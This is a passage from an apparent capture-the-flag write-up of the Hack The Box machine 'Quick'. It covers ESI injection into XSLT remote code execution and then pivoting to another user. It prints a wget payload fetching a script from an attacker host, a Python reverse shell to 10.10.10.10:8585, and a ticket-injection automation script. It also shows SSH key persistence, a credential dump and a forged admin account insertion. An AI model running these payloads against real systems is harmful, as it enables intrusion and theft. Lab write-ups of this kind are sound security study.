class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:output</span> <span class="attr">method</span>=<span class="string">&quot;xml&quot;</span> <span class="attr">omit-xml-declaration</span>=<span class="string">&quot;yes&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:rt</span>=<span class="string">&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;hg8&quot;</span>&gt;</span>&lt;![CDATA[wget 10.10.10.10:8000/hg8.py -O /tmp/hg8.py]]&gt;<span class="tag">&lt;/<span class="name">xsl:variable</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;rtObj&quot;</span> <span class="attr">select</span>=<span class="string">&quot;rt:getRuntime()&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;process&quot;</span> <span class="attr">select</span>=<span class="string">&quot;rt:exec($rtObj, $hg8)&quot;</span>/&gt;</span></span><br><span class="line">Process: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$process&quot;</span>/&gt;</span></span><br><span class="line">Command: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$hg8&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Then let’s open a new ticket so our new <code>xls</code> file get executed:</p><p><img src="https://user-images.githubusercontent.com/9076747/81414862-e772fe00-9147-11ea-8a35-1b3366cef609.png" alt="quick esi injection reverse shell"></p><p>Our server confirms that the file got downloaded successfully:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat hg8.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">import socket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((<span class="string">&quot;10.10.10.10&quot;</span>,8585));</span><br><span class="line">os.dup2(s.fileno(),0);</span><br><span class="line">os.dup2(s.fileno(),1);</span><br><span class="line">os.dup2(s.fileno(),2);</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.10.10.186 - - [08/May/2020 16:20:10] <span class="string">&quot;GET /rce.xsl HTTP/1.1&quot;</span> 200 -</span><br><span class="line">10.10.10.186 - - [08/May/2020 16:20:11] <span class="string">&quot;GET /dummy.xml HTTP/1.1&quot;</span> 200 -</span><br><span class="line">10.10.10.186 - - [08/May/2020 16:20:11] <span class="string">&quot;GET /hg8.py HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure><p>Let’s now do one last injection by replacing our payload to launch the reverse shell we just downloaded to the server:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;hg8&quot;</span>&gt;</span>&lt;![CDATA[python /tmp/hg8.py]]&gt;</span><br></pre></td></tr></table></figure><p>We open our <code>nc</code> listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>Create one last ticket with our new payload and we get an incoming connection:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.186:50914</span><br><span class="line">$ ls</span><br><span class="line">esigate-distribution-5.2</span><br><span class="line">nc</span><br><span class="line">user.txt</span><br><span class="line">$ cat user.txt</span><br><span class="line">cxxxxxxxxxxxxxxxxxxxx8</span><br></pre></td></tr></table></figure><h3 id="Automating-ESI-injection-to-RCE"><a href="#Automating-ESI-injection-to-RCE" class="headerlink" title="Automating ESI injection to RCE"></a>Automating ESI injection to RCE</h3><p>Since I had a lot of issue to create ticket and inject payload (machine reset, caching system, etc…). I had to write the following script in order to ease the process:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">login = s.post(<span class="string">&quot;http://quick.htb:9001/login.php&quot;</span>,</span><br><span class="line">               data=&#123;<span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;elisa@wink.co.uk&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;Quick4cc3$$&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">cache_version = randrange(<span class="number">1000000000</span>)</span><br><span class="line"></span><br><span class="line">ticket_data = &#123;</span><br><span class="line">    <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;hg8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;hg8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;&lt;esi:include src=&quot;http://10.10.10.10:8000/dummy.xml?a=&#123;0&#125;&quot; stylesheet=&quot;http://10.10.10.10:8000/rce.xsl?a=&#123;0&#125;&quot;&gt;&lt;/esi:include&gt;&#x27;</span>.<span class="built_in">format</span>(cache_version),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ticket = s.post(<span class="string">&quot;http://quick.htb:9001/ticket.php&quot;</span>, data=ticket_data, allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p><em>Note: Including the payload in the <code>id</code> field removed the need to load the ticket in order to have the payload to execute.</em></p><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>The first step to make a proper recon is to upgrade our shell to a fully interactive one. To do so I will add my SSH key to the <code>authorized_keys</code> of <code>sam</code> user:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAxxx hg8@htb.htb&quot;</span> &gt;&gt; ~/.ssh/authorized_keys</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">[hg8@archbook ~]$ ssh -i id_rsa_htb sam@quick.htb</span><br><span class="line">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)</span><br><span class="line"></span><br><span class="line">Last login: Tue May  5 09:24:47 2020 from 10.10.14.5</span><br><span class="line">sam@quick:~$</span><br></pre></td></tr></table></figure><p>With this proper shell we can start looking around. A common thing to check is the <code>/var/www/html</code> folder, maybe we can find the database access of the Quick web app and find other accounts credentials. Let’s take a look:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sam@quick:/$ cat /var/www/html/db.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$conn</span> = new mysqli(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;db_adm&quot;</span>,<span class="string">&quot;db_p4ss&quot;</span>,<span class="string">&quot;quick&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>Bingo, we got the database credentials. Let’s connect to see if we can find additional informations:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">sam@quick:/var/www/html$ mysql -u db_adm -p</span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW DATABASES;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| quick              |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; USE quick</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW TABLES;</span><br><span class="line">+-----------------+</span><br><span class="line">| Tables_in_quick |</span><br><span class="line">+-----------------+</span><br><span class="line">| <span class="built_in">jobs</span>            |</span><br><span class="line">| tickets         |</span><br><span class="line">| users           |</span><br><span class="line">+-----------------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM users;</span><br><span class="line">+--------------+------------------+----------------------------------+</span><br><span class="line">| name         | email            | password                         |</span><br><span class="line">+--------------+------------------+----------------------------------+</span><br><span class="line">| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |</span><br><span class="line">| Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |</span><br><span class="line">+--------------+------------------+----------------------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>We got a new account <code>Server Admin</code> and its password which looks like a MD5.<br>But something is odd. We have <code>Elisa</code> password but its MD5 hash doesn’t correspond to the one in the database:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;Quick4cc3$$&quot;</span> | md5sum</span><br><span class="line">81dfe07dcdcf072cf553e37497f188f5  -</span><br></pre></td></tr></table></figure><p>Looking through the source code we got the confirmation that the password is hashed but not with a simple MD5:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sam@quick:/$ cat /var/www/html/login.php</span><br><span class="line"><span class="variable">$email</span>=<span class="variable">$_POST</span>[<span class="string">&quot;email&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = md5(crypt(<span class="variable">$password</span>,<span class="string">&#x27;fa&#x27;</span>));</span><br></pre></td></tr></table></figure><p>In addition, while looking at the current app source code we notice two other folder <code>/var/www/</code> folder:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sam@quick:/$ ls -l /var/www/</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar 20 03:48 html</span><br><span class="line">drwxrwxrwx 2 root root 4096 Mar 21 03:11 <span class="built_in">jobs</span></span><br><span class="line">drwxr-xr-x 6 root root 4096 Mar 21 03:08 printer</span><br></pre></td></tr></table></figure><p>While the <code>jobs</code> folder is empty, the <code>printer</code> function contains another web application:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sam@quick:/$ ls -l /var/www/printer/</span><br><span class="line">total 60</span><br><span class="line">-rw-r--r-- 1 root root 8709 Mar 19 05:04 add_printer.php</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar 18 13:34 css</span><br><span class="line">-rw-r--r-- 1 root root   69 Mar 18 13:22 db.php</span><br><span class="line">drwxr-xr-x 4 root root 4096 Mar 20 02:31 escpos-php</span><br><span class="line">-rw-r--r-- 1 root root 1150 Mar 18 13:34 favicon.ico</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar 18 13:34 fonts</span><br><span class="line">-rw-r--r-- 1 root root 2591 Mar 19 05:30 home.php</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar 19 05:30 images</span><br><span class="line">-rw-r--r-- 1 root root 3348 Mar 20 05:33 index.php</span><br><span class="line">-rw-r--r-- 1 root root 6392 Mar 21 03:08 job.php</span><br><span class="line">-rw-r--r-- 1 root root 5380 Mar 19 05:04 printers.php</span><br><span class="line">sam@quick:/$ cat /var/www/printer/db.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$conn</span> = new mysqli(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;db_adm&quot;</span>,<span class="string">&quot;db_p4ss&quot;</span>,<span class="string">&quot;quick&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>Since this <code>printer</code> app share the same database we can guess that the user <code>Server Admim</code> is used to connect to this app. Let’s know take a quick look at the Apache configuration file to see where the <code>printer</code> app is served.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sam@quick:/$ cat /etc/apache2/sites-enabled/000-default.conf</span><br><span class="line">[...]</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        AssignUserId srvadm srvadm</span><br><span class="line">        ServerName printerv2.quick.htb</span><br><span class="line">        DocumentRoot /var/www/printer</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><p>We get two pieces of valuable information here:</p><ol><li>The app is accessible at <code>http://printerv2.quick.htb</code></li><li>The Apache process for this app is running as <code>srvadm</code>.</li></ol><p>This <code>AssignUserId</code> is very interesting, because if we can find a remote code execution exploit in the <code>printer</code> app, we can obtain a shell as <code>srvadm</code>. Let’s add it to our host file and dig into this <code>printer</code> app to see if it’s possible.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.186 printerv2.quick.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><h3 id="Pivot-sam-gt-srvadm"><a href="#Pivot-sam-gt-srvadm" class="headerlink" title="Pivot sam -&gt; srvadm"></a>Pivot sam -&gt; srvadm</h3><p>Opening <code>http://printerv2.quick.htb:9001</code> display the following login page:</p><p><img src="https://user-images.githubusercontent.com/9076747/81424811-cf56ab00-9156-11ea-9f80-110af7481354.png" alt="quick printer login"></p><p>We are stuck here, we don’t have the password for <code>srvadm@quick.htb</code>  and the credentials of <code>elisa@wink.co.uk</code> doesn’t seems to work. Maybe we could try to write a script to brute force the <code>srvadm@quick.htb</code> using the <code>fa</code> salt ?</p><p> Well first let’s check this login page source code to see if we can find an hint before jumping to the brute force method.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;db.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;email&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$email</span>=<span class="variable">$_POST</span>[<span class="string">&quot;email&quot;</span>];</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line">        <span class="variable">$password</span> = md5(crypt(<span class="variable">$password</span>,<span class="string">&#x27;fa&#x27;</span>));</span><br><span class="line">        <span class="variable">$stmt</span>=<span class="variable">$conn</span>-&gt;prepare(<span class="string">&quot;select email,password from users where email=? and password=?&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;ss&quot;</span>,<span class="variable">$email</span>,<span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;get_result();</span><br><span class="line">        <span class="variable">$num_rows</span> = <span class="variable">$result</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num_rows</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$email</span> === <span class="string">&quot;srvadm@quick.htb&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                session_start();</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&quot;loggedin&quot;</span>]=<span class="variable">$email</span>;</span><br><span class="line">                header(<span class="string">&quot;location: home.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;Invalid Credentials&quot;);window.location.href=&quot;/index.php&quot;;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Few interesting informations to notice here, first:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num_rows</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$email</span> === <span class="string">&quot;srvadm@quick.htb&quot;</span>)</span><br></pre></td></tr></table></figure><p>This explains why we couldn’t login as <code>elisa@wink.co.uk</code>. But wait a second…. If <code>$num_rows &gt; 0</code> is the only check made to see if user credentials are correct we could perfectly use our MySQL access to create a second account with email <code>srvadm@quick.htb</code> and our own password right ? Let’s give it a try:</p><p>First we generate our MD5 password using the <code>fa</code> salt:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sam@quick:/$ php -a</span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt; <span class="built_in">echo</span> md5(crypt(<span class="string">&quot;hg8quickpassword&quot;</span>,<span class="string">&#x27;fa&#x27;</span>));</span><br><span class="line">489000625cdbf4bcda48a8bf0381197a</span><br></pre></td></tr></table></figure><p>Then add our new account using our MySQL access:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sam@quick:/$ mysql -u db_adm -p</span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line"></span><br><span class="line">mysql&gt; USE quick</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO users VALUES (<span class="string">&quot;hg8&quot;</span>, <span class="string">&quot;srvadm@quick.htb&quot;</span>, <span class="string">&quot;489000625cdbf4bcda48a8bf0381197a&quot;</span>);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure><p>We can now try to connect using our newly made credentials:</p><p><img src="https://user-images.githubusercontent.com/9076747/81425687-607a5180-9158-11ea-92d4-cf4faf6106ed.png" alt="quick printer login"></p><p>Without surprise (given the name of the app) we arrive to a printer management interface. The homepage propose two options:</p><ul><li>Add printer</li><li>List printers</li></ul><p>Since there is no printers available, let’s add our own one. I am going to open a <code>nc</code> listener to see if the app is sending request to the networked “printer” we are about to configure:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>Let’s put our listener IP and port on the <code>printer</code> config page:</p><p><img src="https://user-images.githubusercontent.com/9076747/81426297-48570200-9159-11ea-9bc9-7e977e20b31c.png" alt="quick printer add"></p><p>Once the printer added, it gets listed in <code>/printers</code> page:</p><p><img src="https://user-images.githubusercontent.com/9076747/81426543-a257c780-9159-11ea-8a9a-379f338ed4c2.png" alt="quick list printers"></p><p>From there we can launch a “Test print”. Let’s do that:</p><blockquote><p>Printer is up. Please add a <a href="http://printerv2.quick.htb:9001/job.php?title=hg8">job</a></p></blockquote><p>Our <code>nc</code> listener got a connection and got closed:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.186:49180</span><br><span class="line">Total received bytes: 0</span><br><span class="line">Total sent bytes: 0</span><br></pre></td></tr></table></figure><p>Let’s re-open it and head to <code>/job.php</code> to print a test page: </p><p><img src="https://user-images.githubusercontent.com/9076747/81426943-3b86de00-915a-11ea-9ec4-9953d2c9b50f.png" alt="quick printer test print"></p><p>When clicking on “Print” our <code>nc</code> listener receive the content of “Bill Details”:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.186:49222</span><br><span class="line">This is a test.VA</span><br><span class="line">Total received bytes: 20</span><br><span class="line">Total sent bytes: 0</span><br></pre></td></tr></table></figure><p>What exactly happened here? Luckily we have access to the code source of the app, so we can check how the <code>job.php</code> works and maybe a way to exploit it:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">[...]</span><br><span class="line">    <span class="variable">$title</span>=<span class="variable">$_POST</span>[<span class="string">&quot;title&quot;</span>];</span><br><span class="line">    <span class="variable">$file</span> = date(<span class="string">&quot;Y-m-d_H:i:s&quot;</span>);</span><br><span class="line">    file_put_contents(<span class="string">&quot;/var/www/jobs/&quot;</span>.<span class="variable">$file</span>,<span class="variable">$_POST</span>[<span class="string">&quot;desc&quot;</span>]);</span><br><span class="line">    chmod(<span class="string">&quot;/var/www/printer/jobs/&quot;</span>.<span class="variable">$file</span>,<span class="string">&quot;0777&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>=<span class="variable">$conn</span>-&gt;prepare(<span class="string">&quot;select ip,port from jobs&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$result</span>=<span class="variable">$stmt</span>-&gt;get_result();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">[...]</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="variable">$connector</span> = <span class="keyword">new</span> NetworkPrintConnector(<span class="variable">$ip</span>,<span class="variable">$port</span>);</span><br><span class="line">        sleep(<span class="number">0.5</span>); <span class="comment">//Buffer for socket check</span></span><br><span class="line">        <span class="variable">$printer</span> = <span class="keyword">new</span> Printer(<span class="variable">$connector</span>);</span><br><span class="line">        <span class="variable">$printer</span> -&gt; text(file_get_contents(<span class="string">&quot;/var/www/jobs/&quot;</span>.<span class="variable">$file</span>));</span><br><span class="line">        <span class="variable">$printer</span> -&gt; cut();</span><br><span class="line">        <span class="variable">$printer</span> -&gt; close();</span><br><span class="line">        <span class="variable">$message</span>=<span class="string">&quot;Job assigned&quot;</span>;</span><br><span class="line">        unlink(<span class="string">&quot;/var/www/jobs/&quot;</span>.<span class="variable">$file</span>);</span><br><span class="line">      &#125;</span><br><span class="line">[..]</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Reading through the code we understand that our page test input gets written to file in the <code>/var/www/jobs/</code> folder. Then:</p><ol><li>The job get added to database, </li><li>A network print connector is initialized,</li><li>The file get read from <code>/var/www/jobs/</code></li><li>The file content get send to the printer (our <code>nc</code> listener.)</li></ol><p>That’s a lot of steps between the moment the file is written to disk and the moment its read to be send to the printer. This sounds like a perfect scenario for a race condition. </p><p>Knowing that the Apache process for the printer app is running as <code>srvadm</code> we could 